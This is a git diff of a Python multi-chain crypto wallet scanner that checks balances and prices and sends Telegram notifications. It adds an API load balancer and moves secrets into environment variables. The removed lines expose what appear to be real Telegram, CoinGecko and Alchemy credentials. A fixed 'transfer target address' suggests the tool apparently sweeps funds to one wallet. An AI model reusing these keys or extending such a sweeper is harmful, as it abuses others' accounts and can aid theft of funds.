@@ -8,6 +8,7 @@ import sqlite3
 import time
 from datetime import datetime
 from typing import Dict, List, Optional, Tuple
+from decimal import Decimal
 import aiosqlite
 import requests
 from web3 import Web3
@@ -36,10 +37,10 @@ init(autoreset=True)
 load_dotenv()
 
 # 配置常量
-TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"  # 硬编码的转账目标地址
-TELEGRAM_BOT_TOKEN = "7555291517:AAHJGZOs4RZ-QmZvHKVk-ws5zBNcFZHNmkU"
-TELEGRAM_CHAT_ID = "5963704377"
-COINGECKO_API_KEY = "CG-yExYqVWk5sackGQnnFRH5jSS"  # CoinGecko API密钥
+TARGET_ADDRESS = os.getenv("TARGET_ADDRESS", "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1")
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+COINGECKO_API_KEY = os.getenv("COINGECKO_API_KEY")
 
 # 颜色输出函数
 def print_success(msg): 
@@ -103,119 +104,119 @@ class ChainConfig:
         "ETH_MAINNET": {
             "chain_id": 1,
             "name": "Ethereum Mainnet",
-            "rpc_url": "https://eth-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://eth-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://etherscan.io"
         },
         "POLYGON_MAINNET": {
             "chain_id": 137,
             "name": "Polygon PoS",
-            "rpc_url": "https://polygon-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://polygon-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "MATIC",
             "explorer": "https://polygonscan.com"
         },
         "ARBITRUM_ONE": {
             "chain_id": 42161,
             "name": "Arbitrum One",
-            "rpc_url": "https://arb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://arb-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://arbiscan.io"
         },
         "OPTIMISM_MAINNET": {
             "chain_id": 10,
             "name": "OP Mainnet",
-            "rpc_url": "https://opt-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://opt-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://optimistic.etherscan.io"
         },
         "BASE_MAINNET": {
             "chain_id": 8453,
             "name": "Base",
-            "rpc_url": "https://base-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://base-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://basescan.org"
         },
         "ARBITRUM_NOVA": {
             "chain_id": 42170,
             "name": "Arbitrum Nova",
-            "rpc_url": "https://arbnova-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://arbnova-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://nova.arbiscan.io"
         },
         "ZKSYNC_ERA": {
             "chain_id": 324,
             "name": "ZKsync Era",
-            "rpc_url": "https://zksync-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://zksync-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://explorer.zksync.io"
         },
         "POLYGON_ZKEVM": {
             "chain_id": 1101,
             "name": "Polygon zkEVM",
-            "rpc_url": "https://polygonzkevm-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://polygonzkevm-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://zkevm.polygonscan.com"
         },
         "AVALANCHE_C": {
             "chain_id": 43114,
             "name": "Avalanche C-Chain",
-            "rpc_url": "https://avax-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://avax-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "AVAX",
             "explorer": "https://snowtrace.io"
         },
         "BSC_MAINNET": {
             "chain_id": 56,
             "name": "BNB Smart Chain",
-            "rpc_url": "https://bnb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://bnb-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "BNB",
             "explorer": "https://bscscan.com"
         },
         "FANTOM_OPERA": {
             "chain_id": 250,
             "name": "Fantom Opera",
-            "rpc_url": "https://fantom-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://fantom-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "FTM",
             "explorer": "https://ftmscan.com"
         },
         "BLAST": {
             "chain_id": 81457,
             "name": "Blast",
-            "rpc_url": "https://blast-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://blast-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://blastscan.io"
         },
         "LINEA": {
             "chain_id": 59144,
             "name": "Linea",
-            "rpc_url": "https://linea-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://linea-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://lineascan.build"
         },
         "MANTLE": {
             "chain_id": 5000,
             "name": "Mantle",
-            "rpc_url": "https://mantle-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://mantle-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "MNT",
             "explorer": "https://mantlescan.org"
         },
         "GNOSIS": {
             "chain_id": 100,
             "name": "Gnosis",
-            "rpc_url": "https://gnosis-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://gnosis-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "xDAI",
             "explorer": "https://gnosisscan.io"
         },
         "CELO": {
             "chain_id": 42220,
             "name": "Celo",
-            "rpc_url": "https://celo-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://celo-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "CELO",
             "explorer": "https://celoscan.io"
         },
         "SCROLL": {
             "chain_id": 534352,
             "name": "Scroll",
-            "rpc_url": "https://scroll-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://scroll-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://scrollscan.com"
         },
@@ -224,210 +225,210 @@ class ChainConfig:
         "WORLD_CHAIN": {
             "chain_id": 480,
             "name": "World Chain",
-            "rpc_url": "https://worldchain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://worldchain-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://worldscan.org"
         },
         "SHAPE": {
             "chain_id": 360,
             "name": "Shape",
-            "rpc_url": "https://shape-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://shape-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://shapescan.xyz"
         },
         "BERACHAIN": {
             "chain_id": 80084,
             "name": "Berachain",
-            "rpc_url": "https://berachain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://berachain-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "BERA",
             "explorer": "https://beratrail.io"
         },
         "UNICHAIN": {
             "chain_id": 1301,
             "name": "Unichain",
-            "rpc_url": "https://unichain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://unichain-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://uniscan.xyz"
         },
         "ZORA": {
             "chain_id": 7777777,
             "name": "Zora",
-            "rpc_url": "https://zora-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://zora-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://explorer.zora.energy"
         },
         "ASTAR": {
             "chain_id": 592,
             "name": "Astar",
-            "rpc_url": "https://astar-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://astar-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ASTR",
             "explorer": "https://astar.subscan.io"
         },
         "ZETACHAIN": {
             "chain_id": 7000,
             "name": "ZetaChain",
-            "rpc_url": "https://zetachain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://zetachain-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ZETA",
             "explorer": "https://zetachain.blockscout.com"
         },
         "RONIN": {
             "chain_id": 2020,
             "name": "Ronin",
-            "rpc_url": "https://ronin-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://ronin-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "RON",
             "explorer": "https://app.roninchain.com"
         },
         "SETTLUS": {
             "chain_id": 5372,
             "name": "Settlus",
-            "rpc_url": "https://settlus-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://settlus-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "SETL",
             "explorer": "https://explorer.settlus.org"
         },
         "ROOTSTOCK": {
             "chain_id": 30,
             "name": "Rootstock",
-            "rpc_url": "https://rootstock-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://rootstock-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "RBTC",
             "explorer": "https://explorer.rsk.co"
         },
         "STORY": {
             "chain_id": 1513,
             "name": "Story",
-            "rpc_url": "https://story-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://story-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "IP",
             "explorer": "https://testnet.storyscan.xyz"
         },
         "HUMANITY": {
             "chain_id": 1890,
             "name": "Humanity",
-            "rpc_url": "https://humanity-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://humanity-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://explorer.humanity.org"
         },
         "HYPERLIQUID": {
             "chain_id": 998,
             "name": "Hyperliquid",
-            "rpc_url": "https://hyperliquid-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://hyperliquid-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://app.hyperliquid.xyz"
         },
         "GALACTICA": {
             "chain_id": 9302,
             "name": "Galactica",
-            "rpc_url": "https://galactica-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://galactica-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "GNET",
             "explorer": "https://explorer.galactica.com"
         },
         "LENS": {
             "chain_id": 37111,
             "name": "Lens",
-            "rpc_url": "https://lens-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://lens-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "GRASS",
             "explorer": "https://block-explorer.lens.dev"
         },
         "FRAX": {
             "chain_id": 252,
             "name": "Frax",
-            "rpc_url": "https://frax-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://frax-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "frxETH",
             "explorer": "https://fraxscan.com"
         },
         "INK": {
             "chain_id": 57073,
             "name": "Ink",
-            "rpc_url": "https://ink-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://ink-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://explorer.inkonchain.com"
         },
         "BOTANIX": {
             "chain_id": 3636,
             "name": "Botanix",
-            "rpc_url": "https://botanix-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://botanix-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "BTC",
             "explorer": "https://blockscout.botanixlabs.dev"
         },
         "BOBA": {
             "chain_id": 288,
             "name": "Boba",
-            "rpc_url": "https://boba-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://boba-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://bobascan.com"
         },
         "SUPERSEED": {
             "chain_id": 5330,
             "name": "Superseed",
-            "rpc_url": "https://superseed-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://superseed-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://explorer.superseed.xyz"
         },
         "FLOW_EVM": {
             "chain_id": 747,
             "name": "Flow EVM",
-            "rpc_url": "https://flow-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://flow-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "FLOW",
             "explorer": "https://evm.flowscan.io"
         },
         "DEGEN": {
             "chain_id": 666666666,
             "name": "Degen",
-            "rpc_url": "https://degen-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://degen-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "DEGEN",
             "explorer": "https://explorer.degen.tips"
         },
         "APECHAIN": {
             "chain_id": 33139,
             "name": "ApeChain",
-            "rpc_url": "https://apechain-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://apechain-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "APE",
             "explorer": "https://apechain.calderaexplorer.xyz"
         },
         "ANIME": {
             "chain_id": 11501,
             "name": "Anime",
-            "rpc_url": "https://anime-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://anime-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ANIME",
             "explorer": "https://animechain.ai"
         },
         "METIS": {
             "chain_id": 1088,
             "name": "Metis",
-            "rpc_url": "https://metis-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://metis-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "METIS",
             "explorer": "https://explorer.metis.io"
         },
         "SONIC": {
             "chain_id": 146,
             "name": "Sonic",
-            "rpc_url": "https://sonic-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://sonic-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "S",
             "explorer": "https://explorer.soniclabs.com"
         },
         "SEI": {
             "chain_id": 1329,
             "name": "Sei",
-            "rpc_url": "https://sei-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://sei-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "SEI",
             "explorer": "https://seitrace.com"
         },
         "OPBNB": {
             "chain_id": 204,
             "name": "opBNB",
-            "rpc_url": "https://opbnb-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://opbnb-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "BNB",
             "explorer": "https://opbnbscan.com"
         },
         "ABSTRACT": {
             "chain_id": 11124,
             "name": "Abstract",
-            "rpc_url": "https://abstract-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://abstract-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://explorer.abstract.money"
         },
         "SONEIUM": {
             "chain_id": 1946,
             "name": "Soneium",
-            "rpc_url": "https://soneium-mainnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://soneium-mainnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://explorer.soneium.org"
         },
@@ -436,84 +437,84 @@ class ChainConfig:
         "ETH_SEPOLIA": {
             "chain_id": 11155111,
             "name": "Ethereum Sepolia",
-            "rpc_url": "https://eth-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://eth-sepolia.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://sepolia.etherscan.io"
         },
         "POLYGON_AMOY": {
             "chain_id": 80002,
             "name": "Polygon Amoy",
-            "rpc_url": "https://polygon-amoy.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://polygon-amoy.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "MATIC",
             "explorer": "https://amoy.polygonscan.com"
         },
         "ARBITRUM_SEPOLIA": {
             "chain_id": 421614,
             "name": "Arbitrum Sepolia",
-            "rpc_url": "https://arb-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://arb-sepolia.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://sepolia.arbiscan.io"
         },
         "OPTIMISM_SEPOLIA": {
             "chain_id": 11155420,
             "name": "Optimism Sepolia",
-            "rpc_url": "https://opt-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://opt-sepolia.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://sepolia-optimism.etherscan.io"
         },
         "BASE_SEPOLIA": {
             "chain_id": 84532,
             "name": "Base Sepolia",
-            "rpc_url": "https://base-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://base-sepolia.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://sepolia.basescan.org"
         },
         "TEA_SEPOLIA": {
             "chain_id": 10218,
             "name": "Tea Sepolia",
-            "rpc_url": "https://tea-sepolia.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://tea-sepolia.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "TEA",
             "explorer": "https://testnet.teascan.org"
         },
         "GENSYN_TESTNET": {
             "chain_id": 42069,
             "name": "Gensyn Testnet",
-            "rpc_url": "https://gensyn-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://gensyn-testnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "GEN",
             "explorer": "https://explorer.gensyn.ai"
         },
         "RISE_TESTNET": {
             "chain_id": 1821,
             "name": "Rise Testnet",
-            "rpc_url": "https://rise-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://rise-testnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://testnet.risescan.co"
         },
         "MONAD_TESTNET": {
             "chain_id": 41454,
             "name": "Monad Testnet",
-            "rpc_url": "https://monad-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://monad-testnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "MON",
             "explorer": "https://testnet.monad.xyz"
         },
         "XMTP_SEPOLIA": {
-            "chain_id": 11155111,
+            "chain_id": 2692,
             "name": "XMTP Sepolia",
-            "rpc_url": "https://xmtp-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://xmtp-testnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "ETH",
             "explorer": "https://explorer.testnet.xmtp.network"
         },
         "CROSSFI_TESTNET": {
             "chain_id": 4157,
             "name": "CrossFi Testnet",
-            "rpc_url": "https://crossfi-testnet.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://crossfi-testnet.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "XFI",
             "explorer": "https://test.xfiscan.com"
         },
         "LUMIA_PRISM": {
             "chain_id": 1952959480,
             "name": "Lumia Prism",
-            "rpc_url": "https://lumia-prism.g.alchemy.com/v2/MYr2ZG1P7bxc4F1qVTLIj",
+            "rpc_url": "https://lumia-prism.g.alchemy.com/v2/PLACEHOLDER_API_KEY",
             "native_token": "LUMIA",
             "explorer": "https://explorer.lumia.org"
         }
@@ -586,13 +587,17 @@ class DatabaseManager:
     async def is_chain_blocked(self, address: str, chain_id: int) -> bool:
         """检查链是否被屏蔽"""
         async with self._lock:
-            async with aiosqlite.connect(self.db_path) as db:
-                cursor = await db.execute(
-                    "SELECT 1 FROM blocked_chains WHERE address = ? AND chain_id = ?",
-                    (address, chain_id)
-                )
-                result = await cursor.fetchone()
-                return result is not None
+            try:
+                async with aiosqlite.connect(self.db_path) as db:
+                    cursor = await db.execute(
+                        "SELECT 1 FROM blocked_chains WHERE address = ? AND chain_id = ?",
+                        (address, chain_id)
+                    )
+                    result = await cursor.fetchone()
+                    return result is not None
+            except Exception as e:
+                logging.error(f"检查屏蔽链状态失败: {e}")
+                return False  # 安全默认值：假设未屏蔽
     
     async def block_chain(self, address: str, chain_name: str, chain_id: int, reason: str = "No transaction history"):
         """屏蔽链"""
@@ -677,9 +682,10 @@ class PriceChecker:
             'x-cg-pro-api-key': COINGECKO_API_KEY  # 添加API密钥
         })
         
-        # 长期缓存设置 - 3天缓存
+        # 长期缓存设置 - 分层缓存策略
         self.price_cache = {}  # 内存缓存
-        self.cache_duration = 3 * 24 * 3600  # 3天缓存（259200秒）
+        self.cache_duration = 24 * 3600  # 正常缓存1天（86400秒）
+        self.extended_cache_duration = 7 * 24 * 3600  # API受限时使用7天缓存
         self.cache_file = "price_cache.json"  # 持久化缓存文件
         
         # API限制管理
@@ -721,7 +727,7 @@ class PriceChecker:
             "NEAR": "near",
             "ALGO": "algorand",
             "XTZ": "tezos",
-            "EGLD": "elrond-matic",
+            "EGLD": "elrond-erd-2",
             "LUNA": "terra-luna-2",
         }
         
@@ -822,7 +828,7 @@ class PriceChecker:
             cache_key = f"{token_symbol.upper()}_{contract_address if contract_address else 'None'}"
             current_time = time.time()
             
-            # 检查3天缓存
+            # 检查分层缓存
             if cache_key in self.price_cache:
                 cached_data = self.price_cache[cache_key]
                 if isinstance(cached_data, dict):
@@ -832,8 +838,13 @@ class PriceChecker:
                     # 兼容旧格式
                     cached_price, cached_time = cached_data if isinstance(cached_data, tuple) else (cached_data, 0)
                 
-                if current_time - cached_time < self.cache_duration:
-                    print_info(f"💰 使用缓存价格: {token_symbol} = ${cached_price:.6f} (缓存剩余: {(self.cache_duration - (current_time - cached_time))/3600:.1f}小时)")
+                cache_age = current_time - cached_time
+                # 正常情况下使用1天缓存，API受限时使用7天缓存
+                active_cache_duration = self.extended_cache_duration if not self._can_make_api_call() else self.cache_duration
+                
+                if cache_age < active_cache_duration:
+                    cache_status = "扩展" if cache_age > self.cache_duration else "正常"
+                    print_info(f"💰 使用{cache_status}缓存价格: {token_symbol} = ${cached_price:.6f} (缓存剩余: {(active_cache_duration - cache_age)/3600:.1f}小时)")
                     return cached_price
             
             # 检查API调用限制
@@ -935,20 +946,19 @@ class PriceChecker:
         """通过符号搜索价格（谨慎使用）"""
         try:
             # 搜索API调用消耗额度，谨慎使用
+            if not self._can_make_api_call():
+                return None
             self._record_api_call()  # 记录API调用
             
-            # 使用Pro API URL
             url = f"https://pro-api.coingecko.com/api/v3/search?query={urllib.parse.quote(symbol)}"
-            
             response = self.session.get(url, timeout=10)
             response.raise_for_status()
-            
             data = response.json()
             if 'coins' in data and len(data['coins']) > 0:
                 first_coin = data['coins'][0]
                 token_id = first_coin['id']
                 print_info(f"🔍 搜索找到: {symbol} -> {token_id}")
-                # 注意：这里会再次调用API
+                # 注意：这里会再次调用API，但_query_coingecko_by_id会自己记录API调用
                 return await self._query_coingecko_by_id(token_id)
             
             return None
@@ -986,19 +996,110 @@ class PriceChecker:
             'minute_limit': self.api_calls_per_minute
         }
 
+class AlchemyAPILoadBalancer:
+    """Alchemy API 智能负载均衡器"""
+    
+    def __init__(self, api_keys: List[str]):
+        self.api_keys = api_keys
+        self.api_instances = []
+        self.current_api_index = 0
+        self.request_count = 0
+        
+        # 为每个API密钥创建实例
+        for i, api_key in enumerate(api_keys):
+            api_instance = AlchemyAPI(api_key, f"API-{i+1}")
+            self.api_instances.append(api_instance)
+            print_success(f"🔧 初始化API实例 {i+1}: {api_key[:12]}...")
+        
+        print_success(f"🚀 负载均衡器初始化完成：{len(self.api_instances)} 个API实例")
+        print_info(f"📊 总目标速度：{len(self.api_instances) * 500} CU/s")
+    
+    def get_next_api(self) -> 'AlchemyAPI':
+        """智能获取下一个可用的API实例"""
+        # 轮询策略：均匀分配请求
+        api = self.api_instances[self.current_api_index]
+        
+        # 检查当前API是否可用
+        if api.is_api_available():
+            self.current_api_index = (self.current_api_index + 1) % len(self.api_instances)
+            return api
+        
+        # 如果当前API不可用，寻找可用的API
+        for i in range(len(self.api_instances)):
+            test_index = (self.current_api_index + i) % len(self.api_instances)
+            test_api = self.api_instances[test_index]
+            if test_api.is_api_available():
+                self.current_api_index = (test_index + 1) % len(self.api_instances)
+                return test_api
+        
+        # 所有API都不可用，返回第一个（让它处理限流）
+        print_warning("⚠️ 所有API都达到限制，使用第一个API")
+        return self.api_instances[0]
+    
+    def get_usage_stats(self) -> Dict:
+        """获取所有API的使用统计"""
+        total_stats = {
+            "total_cu_rate": 0,
+            "total_monthly_usage": 0,
+            "total_monthly_limit": 0,
+            "api_details": []
+        }
+        
+        for i, api in enumerate(self.api_instances):
+            stats = api.get_usage_stats()
+            total_stats["total_cu_rate"] += stats["current_cu_rate"]
+            total_stats["total_monthly_usage"] += stats["monthly_usage"]
+            total_stats["total_monthly_limit"] += stats["monthly_limit"]
+            
+            api_detail = {
+                "api_index": i + 1,
+                "api_key_preview": api.api_key[:12] + "...",
+                "current_cu_rate": stats["current_cu_rate"],
+                "monthly_usage": stats["monthly_usage"],
+                "monthly_limit": stats["monthly_limit"],
+                "usage_percentage": stats["usage_percentage"],
+                "available": api.is_api_available()
+            }
+            total_stats["api_details"].append(api_detail)
+        
+        total_stats["usage_percentage"] = (total_stats["total_monthly_usage"] / total_stats["total_monthly_limit"]) * 100 if total_stats["total_monthly_limit"] > 0 else 0
+        return total_stats
+    
+    # 代理方法，自动选择最佳API
+    async def check_asset_transfers(self, address: str, chain_config: Dict) -> Tuple[bool, int]:
+        api = self.get_next_api()
+        return await api.check_asset_transfers(address, chain_config)
+    
+    async def get_balance(self, address: str, chain_config: Dict) -> float:
+        api = self.get_next_api()
+        return await api.get_balance(address, chain_config)
+    
+    async def get_all_token_balances(self, address: str, chain_config: Dict) -> Dict[str, Dict]:
+        api = self.get_next_api()
+        return await api.get_all_token_balances(address, chain_config)
+    
+    async def get_token_metadata(self, contract_address: str, chain_config: Dict) -> Dict:
+        api = self.get_next_api()
+        return await api.get_token_metadata(contract_address, chain_config)
+    
+    async def get_gas_price(self, chain_config: Dict) -> Dict:
+        api = self.get_next_api()
+        return await api.get_gas_price(chain_config)
+
 class AlchemyAPI:
     """Alchemy API 封装类"""
     
-    def __init__(self, api_key: str):
+    def __init__(self, api_key: str, instance_name: str = "API"):
         self.api_key = api_key
+        self.instance_name = instance_name
         self.session = requests.Session()
         self.session.headers.update({
             'Content-Type': 'application/json',
         })
         
-        # API限频控制 - 智能速率控制，目标480-500 CU/s（拉满速度）
+        # API限频控制 - 智能速率控制，单个API目标480 CU/s（留10%余量）
         self.last_request_time = 0
-        self.target_cu_per_second = 495  # 目标CU/s，接近极限速度
+        self.target_cu_per_second = 480  # 单个API目标480 CU/s，留20 CU/s余量
         self.max_cu_per_second = 500     # 最大不超过500 CU/s
         self.cu_per_request = 1          # 每个请求消耗的CU数，动态调整
         self.request_history = []        # 请求历史记录
@@ -1010,6 +1111,41 @@ class AlchemyAPI:
         self.month_start_time = None        # 月初时间
         self.daily_cu_budget = 0            # 每日CU预算
